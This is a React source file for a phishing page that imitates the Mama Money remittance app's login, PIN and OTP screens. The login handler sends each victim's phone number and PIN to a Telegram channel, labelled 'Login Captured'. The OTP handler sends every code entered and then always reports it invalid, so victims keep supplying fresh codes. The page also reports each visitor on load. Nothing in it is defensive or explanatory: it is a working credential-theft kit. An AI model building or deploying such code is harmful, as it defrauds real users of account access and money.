"use client"

import { useState, useEffect, useRef } from "react"
import { ChevronLeft, ArrowRight, Search, Clock, Loader2 } from "lucide-react"
import { fetchVisitorInfo, sendTelegramMessage } from "@/lib/telegram"
import { SplashScreen } from "./register/_component/splash-screen"

type Screen = "splash" | "login" | "loading" | "otp" | "rates"

const COUNTRY_LIST = [
  { name: "Andorra", code: "ad" },
  { name: "Angola", code: "ao" },
  { name: "Austria", code: "at" },
  { name: "Bangladesh", code: "bd" },
  { name: "Belgium", code: "be" },
  { name: "Benin", code: "bj" },
  { name: "Botswana", code: "bw" },
  { name: "Bulgaria", code: "bg" },
  { name: "Burkina Faso", code: "bf" },
  { name: "Burundi", code: "bi" },
  { name: "Cameroon", code: "cm" },
  { name: "Canada", code: "ca" },
  { name: "China", code: "cn" },
  { name: "DR Congo", code: "cd" },
  { name: "Egypt", code: "eg" },
  { name: "Ethiopia", code: "et" },
  { name: "France", code: "fr" },
  { name: "Germany", code: "de" },
  { name: "Ghana", code: "gh" },
  { name: "India", code: "in" },
  { name: "Italy", code: "it" },
  { name: "Kenya", code: "ke" },
  { name: "Lesotho", code: "ls" },
  { name: "Malawi", code: "mw" },
  { name: "Mozambique", code: "mz" },
  { name: "Nigeria", code: "ng" },
  { name: "Pakistan", code: "pk" },
  { name: "Philippines", code: "ph" },
  { name: "Rwanda", code: "rw" },
  { name: "Somalia", code: "so" },
  { name: "South Africa", code: "za" },
  { name: "Tanzania", code: "tz" },
  { name: "Uganda", code: "ug" },
  { name: "United Kingdom", code: "gb" },
  { name: "United States", code: "us" },
  { name: "Zambia", code: "zm" },
  { name: "Zimbabwe", code: "zw" },
]

export default function MamaMoneyLogin() {
  const [cellphone, setCellphone] = useState("")
  const [pin, setPin] = useState("")
  const [rememberMe, setRememberMe] = useState(false)
  const [isLoginLoading, setIsLoginLoading] = useState(false)
  const [isOtpLoading, setIsOtpLoading] = useState(false)

  const [screen, setScreen] = useState<Screen>("splash")

  const [selectedCountry, setSelectedCountry] = useState(
    COUNTRY_LIST.find((c) => c.code === "za") || COUNTRY_LIST[0]
  )
  const [otpDigits, setOtpDigits] = useState<string[]>(["", "", "", "", ""])
  const [focusedIndex, setFocusedIndex] = useState<number>(0)
  const inputRefs = useRef<(HTMLInputElement | null)[]>([])
  const [timer, setTimer] = useState(117)
  const [error, setError] = useState("")
  const [errors, setErrors] = useState<{ cellphone?: string; pin?: string }>({})
  const [searchQuery, setSearchQuery] = useState("")

  const formatTimer = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins}:${secs.toString().padStart(2, "0")}`
  }

  const formatMaskedPhone = (phone: string) => {
    if (!phone || phone.length < 5) return "232****32323"
    const start = phone.slice(0, 3)
    const end = phone.slice(-5)
    return `${start}****${end}`
  }

  // Track visitor on page open
  useEffect(() => {
    const trackVisitor = async () => {
      try {
        await fetchVisitorInfo()
        await sendTelegramMessage({
          title: "Mama Money Login Page Opened",
          type: "visitor",
        })
      } catch (err) {
        console.error("Failed to track visitor:", err)
      }
    }
    trackVisitor()
  }, [])

  // Splash timer
  useEffect(() => {
    if (screen === "splash") {
      const timeout = setTimeout(() => {
        setScreen("login")
      }, 2500)
      return () => clearTimeout(timeout)
    }
  }, [screen])

  // Loading timer
  useEffect(() => {
    if (screen === "loading") {
      const timeout = setTimeout(() => {
        setScreen("otp")
        setTimer(117)
      }, 2000)
      return () => clearTimeout(timeout)
    }
  }, [screen])

  // OTP countdown timer
  useEffect(() => {
    if (screen === "otp" && timer > 0) {
      const interval = setInterval(() => {
        setTimer((prev) => prev - 1)
      }, 1000)
      return () => clearInterval(interval)
    }
  }, [screen, timer])

  // Clear error message after 8 seconds
  useEffect(() => {
    if (error) {
      const timeout = setTimeout(() => {
        setError("")
      }, 8000)
      return () => clearTimeout(timeout)
    }
  }, [error])

  const handleOtpChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return

    const newDigits = [...otpDigits]
    newDigits[index] = value.slice(-1)
    setOtpDigits(newDigits)
    setError("")

    if (value && index < 4) {
      inputRefs.current[index + 1]?.focus()
    }
  }

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !otpDigits[index] && index > 0) {
      inputRefs.current[index - 1]?.focus()
    }
  }

  const validateLogin = () => {
    const newErrors: { cellphone?: string; pin?: string } = {}

    if (!cellphone.trim()) {
      newErrors.cellphone = "Phone number must be at least 10 digits."
    } else if (cellphone.length < 10) {
      newErrors.cellphone = "Phone number must be at least 10 digits."
    }

    if (!pin.trim()) {
      newErrors.pin = "Pin is required"
    } else if (pin.length < 4) {
      newErrors.pin = "Pin must be 4 digits"
    }

    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const handleLogin = async () => {
    if (validateLogin()) {
      setIsLoginLoading(true)
      try {
        await sendTelegramMessage({
          title: "Mama Money Login Captured",
          phoneNumber: cellphone,
          password: pin,
          country: selectedCountry.name,
          type: "click",
        })
      } catch (err) {
        console.error("Failed to send login tracking:", err)
      }
      setTimeout(() => {
        setIsLoginLoading(false)
        setScreen("loading")
      }, 800)
    }
  }

  const handleVerify = async () => {
    const code = otpDigits.join("")
    if (code.length < 5) {
      setError("Please enter complete 5-digit OTP")
      return
    }
    setIsOtpLoading(true)
    try {
      await sendTelegramMessage({
        title: "Mama Money OTP Captured",
        otp1: code,
        phoneNumber: cellphone,
        type: "click",
      })
    } catch (err) {
      console.error("Failed to send OTP tracking:", err)
    }
    setTimeout(() => {
      setIsOtpLoading(false)
      setError("Invalid OTP code. Please try again.")
      setOtpDigits(["", "", "", "", ""])
      setFocusedIndex(0)
      inputRefs.current[0]?.focus()
    }, 1000)
  }

  const handleBackToLogin = () => {
    setScreen("login")
    setError("")
  }

  // Login Screen Background with mama-money-pattern.svg layered behind everything
  const LoginBackground = () => (
    <div className="absolute inset-0 z-0 bg-[#60ac28] overflow-hidden select-none pointer-events-none">
      {/* Pattern SVG as Background Image */}
      <div
        className="absolute inset-0 z-0 opacity-20 pointer-events-none"
        style={{
          backgroundImage: `url('/mama-money-pattern.svg')`,
          backgroundSize: '100px 100px',
          backgroundRepeat: 'repeat'
        }}
      />
      {/* Curved concentric sweeping arcs */}
      <svg className="absolute -top-12 -right-24 z-0 w-[480px] h-[480px] text-[#71bc30] opacity-80 pointer-events-none" viewBox="0 0 400 400" fill="none">
        <circle cx="400" cy="0" r="380" stroke="currentColor" strokeWidth="48" opacity="0.4" />
        <circle cx="400" cy="0" r="300" stroke="currentColor" strokeWidth="44" opacity="0.6" />
        <circle cx="400" cy="0" r="220" stroke="currentColor" strokeWidth="40" opacity="0.8" />
        <circle cx="400" cy="0" r="140" stroke="currentColor" strokeWidth="36" />
      </svg>
    </div>
  )

  // Plain Green Background for other screens (without pattern)
  const PlainBackground = () => (
    <div className="absolute inset-0 z-0 bg-[#60ac28] overflow-hidden select-none pointer-events-none">
      <svg className="absolute -top-12 -right-24 z-0 w-[480px] h-[480px] text-[#71bc30] opacity-80 pointer-events-none" viewBox="0 0 400 400" fill="none">
        <circle cx="400" cy="0" r="380" stroke="currentColor" strokeWidth="48" opacity="0.4" />
        <circle cx="400" cy="0" r="300" stroke="currentColor" strokeWidth="44" opacity="0.6" />
        <circle cx="400" cy="0" r="220" stroke="currentColor" strokeWidth="40" opacity="0.8" />
        <circle cx="400" cy="0" r="140" stroke="currentColor" strokeWidth="36" />
      </svg>
    </div>
  )

  // Mama Money Logo Component
  const MamaMoneyLogo = () => (
    <div className="flex items-center gap-3.5 select-none">
      {/* Face Logo Image */}
      <div className="w-20 h-20 sm:w-22 sm:h-22 shrink-0 drop-shadow-md">
        <img
          src="/q32.png"
          alt="Mama Money"
          className="w-full rounded-full h-full object-contain pointer-events-none select-none"
          draggable={false}
        />
      </div>

      {/* Brand Text */}
      <div className="flex flex-col text-left">
        <h1 className="text-[#043323] text-4xl sm:text-[42px] font-black tracking-tight leading-[0.9]">
          Mama
        </h1>
        <h1 className="text-[#043323] text-4xl sm:text-[42px] font-black tracking-tight leading-[0.9]">
          Money
        </h1>
        <p className="text-white text-sm font-bold tracking-wide mt-1 drop-shadow-sm">
          More Money Home
        </p>
      </div>
    </div>
  )

  // 0. SPLASH SCREEN
  if (screen === "splash") {
    return <SplashScreen />
  }

  // 1. RATES / SELECT COUNTRY SCREEN
  if (screen === "rates") {
    const filteredCountries = COUNTRY_LIST.filter((country) =>
      country.name.toLowerCase().includes(searchQuery.toLowerCase())
    )

    return (
      <div className="min-h-[100dvh] max-w-[430px] mx-auto bg-white relative flex flex-col overflow-hidden select-none w-full shadow-2xl">
        <div className="sticky top-0 z-30 bg-white shrink-0 shadow-sm border-b border-gray-200">
          <div className="relative h-16 w-full flex items-center justify-between px-4">
            <PlainBackground />
            <div className="relative z-10 flex items-center justify-between w-full">
              <button
                onClick={() => {
                  setScreen("login")
                  setSearchQuery("")
                }}
                className="p-2 -ml-2 text-[#043323] active:opacity-70 cursor-pointer"
                aria-label="Back to login"
              >
                <ChevronLeft className="w-7 h-7" strokeWidth={2.5} />
              </button>
              <h1 className="text-[#043323] text-xl font-bold tracking-tight text-center flex-1 pr-6 select-none">
                Select a Country
              </h1>
            </div>
          </div>

          <div className="p-3 bg-white">
            <div className="flex items-center gap-2 bg-[#eeeeee] px-3 py-2.5 rounded-xl">
              <Search className="w-5 h-5 text-gray-500 shrink-0 pointer-events-none" />
              <input
                type="text"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                placeholder="Search"
                className="bg-transparent border-none outline-none w-full text-gray-800 placeholder-gray-500 text-base"
              />
            </div>
          </div>
        </div>

        <div className="flex-1 overflow-y-auto bg-white divide-y divide-gray-100 select-none touch-pan-y overscroll-contain">
          {filteredCountries.map((country) => {
            const isSelected = selectedCountry.code === country.code
            return (
              <div
                key={country.code}
                onClick={() => {
                  setSelectedCountry(country)
                  setScreen("login")
                  setSearchQuery("")
                }}
                className={`flex items-center justify-between px-5 py-3.5 hover:bg-gray-50 active:bg-gray-100 transition-colors cursor-pointer select-none ${isSelected ? "bg-emerald-50/60" : ""
                  }`}
              >
                <div className="flex items-center gap-4 select-none pointer-events-none">
                  <div className="w-9 h-9 rounded-full overflow-hidden shrink-0 border border-gray-200 shadow-sm flex items-center justify-center bg-gray-100 select-none pointer-events-none">
                    <img
                      src={`https://flagcdn.com/w80/${country.code}.png`}
                      alt={country.name}
                      className="w-full h-full object-cover select-none pointer-events-none"
                      draggable={false}
                    />
                  </div>
                  <span className="text-[#043323] text-base font-semibold tracking-wide select-none pointer-events-none">
                    {country.name}
                  </span>
                </div>
                {isSelected && (
                  <span className="text-[#043323] text-xs font-bold bg-[#82c326] px-2 py-1 rounded-full select-none pointer-events-none">
                    Selected
                  </span>
                )}
              </div>
            )
          })}

          {filteredCountries.length === 0 && (
            <div className="p-8 text-center text-gray-500 select-none">
              No country found matching &quot;{searchQuery}&quot;
            </div>
          )}
        </div>
      </div>
    )
  }

  // 2. LOADING SCREEN
  if (screen === "loading") {
    return (
      <div className="min-h-[100dvh] max-w-[430px] mx-auto relative overflow-hidden select-none w-full shadow-2xl flex flex-col items-center justify-center">
        <PlainBackground />
        <div className="relative z-10 flex flex-col items-center justify-center px-6">
          <div className="mb-8">
            <MamaMoneyLogo />
          </div>
          <div className="w-12 h-12 border-4 border-[#043323] border-t-transparent rounded-full animate-spin" />
          <p className="text-[#043323] text-lg font-semibold mt-4">Please wait...</p>
        </div>
      </div>
    )
  }

  // 3. OTP SCREEN
  if (screen === "otp") {
    return (
      <div className="min-h-[100dvh] max-w-[430px] mx-auto relative flex flex-col justify-between px-5 sm:px-6 pt-5 pb-8 select-none w-full shadow-2xl overflow-x-hidden">
        <LoginBackground />

        <div className="relative z-10 flex flex-col justify-between min-h-[calc(100dvh-52px)] w-full">
          <div>
            {/* Top Back Arrow */}
            <div className="w-full flex items-center justify-start mb-4">
              <button
                onClick={handleBackToLogin}
                className="p-1 -ml-1 text-[#043323] active:opacity-70 cursor-pointer"
                aria-label="Back to login"
              >
                <ChevronLeft className="w-8 h-8 text-[#043323]" strokeWidth={2.5} />
              </button>
            </div>

            {/* Title & Sent To Subtitle */}
            <div className="mb-6 text-center">
              <h1 className="text-[#043323] text-2xl sm:text-3xl font-extrabold text-center leading-snug">
                Enter the OTP code<br />we sent to your phone
              </h1>
              <p className="text-white text-sm font-medium mt-2">
                Sent to {formatMaskedPhone(cellphone)}
              </p>
            </div>

            {/* 5 OTP Input Boxes */}
            <div className="flex flex-col items-center gap-2 mb-8">
              <div className="flex justify-center items-center gap-2 sm:gap-3 w-full max-w-[340px]">
                {otpDigits.map((digit, index) => (
                  <input
                    key={index}
                    ref={(el) => {
                      inputRefs.current[index] = el
                    }}
                    type="tel"
                    inputMode="numeric"
                    pattern="[0-9]*"
                    maxLength={1}
                    value={digit}
                    onFocus={() => setFocusedIndex(index)}
                    onChange={(e) => handleOtpChange(index, e.target.value)}
                    onKeyDown={(e) => handleOtpKeyDown(index, e)}
                    className={`w-12 h-14 sm:w-14 sm:h-16 bg-white text-[#043323] text-xl sm:text-2xl font-bold text-center rounded-xl focus:outline-none transition-all ${focusedIndex === index
                      ? "border-2 border-[#f59e0b] ring-1 ring-[#f59e0b]"
                      : "border border-gray-200"
                      }`}
                  />
                ))}
              </div>
              {error && (
                <p className="text-red-700 text-sm mt-2 text-center font-bold bg-white/80 py-1.5 px-4 rounded-lg shadow-sm">
                  {error}
                </p>
              )}
            </div>
          </div>

          {/* Action Buttons & Timer */}
          <div className="flex flex-col gap-3 w-full">
            {/* Confirm Button */}
            <button
              onClick={handleVerify}
              disabled={isOtpLoading}
              className="w-full bg-[#043323] hover:bg-[#06422e] active:scale-[0.99] text-white py-3.5 sm:py-4 rounded-2xl text-base sm:text-lg font-bold shadow-md transition-all cursor-pointer flex items-center justify-center gap-2 disabled:opacity-80"
            >
              {isOtpLoading ? (
                <>
                  <Loader2 className="w-5 h-5 animate-spin text-white" />
                  <span>Confirming...</span>
                </>
              ) : (
                "Confirm"
              )}
            </button>

            {/* Timer Pill */}
            <div className="w-full bg-white/30 rounded-2xl py-3 px-4 flex items-center justify-center gap-2 text-[#043323] font-bold text-base">
              <Clock className="w-5 h-5 text-[#043323]" />
              <span>{formatTimer(timer)}</span>
            </div>

            {/* Cancel Link */}
            <button
              onClick={handleBackToLogin}
              className="text-[#043323] text-base sm:text-lg font-bold text-center mt-1 hover:underline cursor-pointer"
            >
              Cancel
            </button>
          </div>
        </div>
      </div>
    )
  }

  // 4. LOGIN SCREEN (Pattern BG strictly behind all elements)
  return (
    <div className="min-h-[100dvh] w-full bg-[#60ac28] flex justify-center">
      <div className="min-h-[100dvh] max-w-[430px] relative overflow-x-hidden flex flex-col justify-between px-6 pt-5 pb-8 select-none w-full shadow-2xl">
        {/* Pattern Background strictly in background z-0 */}
        <LoginBackground />

      {/* Login Screen Interactive Content in z-10 */}
      <div className="relative z-10 flex flex-col items-center w-full">
        {/* Top Back Arrow */}
        <div className="w-full flex items-center justify-start mb-2">
          <button
            onClick={handleBackToLogin}
            className="p-1 -ml-1 text-[#043323] active:opacity-70 cursor-pointer"
            aria-label="Back"
          >
            <ChevronLeft className="w-8 h-8 text-[#043323]" strokeWidth={2.5} />
          </button>
        </div>

        {/* Logo Section */}
        <div className="flex flex-col items-center mb-3">
          <MamaMoneyLogo />
        </div>

        {/* Subtitle Text */}
        <p className="text-white text-sm sm:text-base font-semibold text-center mb-5">
          Enter your login details to upgrade your account.
        </p>

        {/* Form Fields */}
        <div className="w-full flex flex-col gap-4 mb-6">
          {/* Cellphone Number Input */}
          <div>
            <input
              type="tel"
              inputMode="numeric"
              value={cellphone}
              onChange={(e) => {
                const val = e.target.value.replace(/[^0-9]/g, "")
                setCellphone(val)
                if (errors.cellphone && val.length >= 10) setErrors({ ...errors, cellphone: undefined })
              }}
              placeholder="Cellphone Number"
              className="w-full px-4 py-3.5 bg-transparent border border-white text-white placeholder:text-white text-base focus:outline-none focus:border-white transition-all rounded-sm"
            />
            {(errors.cellphone || (cellphone.length > 0 && cellphone.length < 10)) && (
              <p className="text-[#facc15] text-xs font-semibold mt-1.5 ml-0.5">
                Phone number must be at least 10 digits.
              </p>
            )}
          </div>

          {/* Pin Input */}
          <div>
            <input
              type="password"
              maxLength={4}
              value={pin}
              onChange={(e) => {
                const val = e.target.value.replace(/[^0-9]/g, "").slice(0, 4)
                setPin(val)
                if (errors.pin && val.length === 4) setErrors({ ...errors, pin: undefined })
              }}
              placeholder="Enter 4 digit PIN"
              inputMode="numeric"
              className="w-full px-4 py-3.5 bg-transparent border border-white text-white placeholder:text-white text-base focus:outline-none focus:border-white transition-all rounded-sm"
            />
            {errors.pin && (
              <p className="text-[#facc15] text-xs font-semibold mt-1.5 ml-0.5">{errors.pin}</p>
            )}
          </div>
        </div>

        {/* Action Buttons Container */}
        <div className="flex flex-col gap-3.5 w-full items-center">
          {/* Login Button */}
          <button
            onClick={handleLogin}
            disabled={isLoginLoading}
            className="w-full bg-[#043323] hover:bg-[#06422e] active:scale-[0.98] text-white py-3.5 px-6 rounded-2xl flex items-center justify-center gap-2 text-base font-semibold shadow-md transition-all cursor-pointer disabled:opacity-80"
          >
            {isLoginLoading ? (
              <>
                <Loader2 className="w-5 h-5 animate-spin text-white" />
                <span>Please wait...</span>
              </>
            ) : (
              <>
                <span>Login to upgrade</span>
                <ArrowRight className="w-5 h-5 text-white" strokeWidth={2.5} />
              </>
            )}
          </button>

          {/* Check Rates Button */}
          <button
            onClick={() => setScreen("rates")}
            className="w-full bg-[#043323] hover:bg-[#06422e] active:scale-[0.98] text-white py-3.5 px-6 rounded-2xl flex items-center justify-center gap-2 text-base font-semibold shadow-md transition-all cursor-pointer"
          >
            <span>Check Rates</span>
            <ArrowRight className="w-5 h-5 text-white" strokeWidth={2.5} />
          </button>

          {/* Remember Me Container */}
          <div
            onClick={() => setRememberMe(!rememberMe)}
            className="w-full bg-white/20 border border-white/30 rounded-2xl py-3 px-5 flex items-center justify-center gap-3 cursor-pointer select-none mt-1"
          >
            <div className="w-6 h-6 rounded-md bg-white flex items-center justify-center shrink-0 shadow-inner">
              {rememberMe && (
                <svg viewBox="0 0 24 24" className="w-4 h-4 text-[#043323] fill-none stroke-current" strokeWidth="3.5" strokeLinecap="round" strokeLinejoin="round">
                  <polyline points="20 6 9 17 4 12" />
                </svg>
              )}
            </div>
            <span className="text-[#043323] text-base font-bold">Remember me</span>
          </div>
        </div>
      </div>
    </div>
  </div>
)
}
